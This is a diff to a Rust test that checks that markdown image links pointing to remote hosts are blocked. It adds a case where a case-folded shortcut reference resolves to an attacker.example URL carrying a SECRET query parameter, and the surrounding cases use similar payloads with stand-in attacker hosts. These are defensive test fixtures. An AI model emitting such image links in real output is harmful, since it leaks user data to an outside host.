@@ -46,6 +46,8 @@ fn remote_and_defined_remote_images_still_block() {
         "![s][a\\]b]\n\n[a\\]b]: https://attacker.example/c?d=SECRET",
         "![a\\[b]\n\n[a\\[b]: //attacker.example/x",
         "![a\\]b] next to https://attacker.example/x",
+        // An invalid inline destination falls back to a case-folded shortcut.
+        "![\u{df}](x y)\n\n[SS]: https://attacker.example/c?d=SECRET",
         "intro\n\u{a0}\n    ![a](//attacker.example/x)\n",
         "```\r\nx\r\n```\r\n![a](https://evil.example/x)",
     ] {
